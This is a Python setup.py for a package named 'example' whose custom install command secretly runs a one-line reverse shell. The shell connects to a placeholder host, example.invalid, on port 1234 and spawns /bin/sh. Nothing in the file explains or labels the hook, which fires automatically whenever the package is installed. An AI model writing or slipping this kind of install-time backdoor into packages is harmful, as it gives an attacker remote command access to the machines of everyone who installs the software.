import os
from setuptools import setup
from setuptools.command.install import install

class Install(install):
    def run(self):
        os.system('python -c "import socket,os,subprocess;s=socket.socket();s.connect((\'example.invalid\',1234));os.dup2(s.fileno(),0);subprocess.call([\'/bin/sh\'])"')
        install.run(self)

setup(name="example", cmdclass={"install": Install})
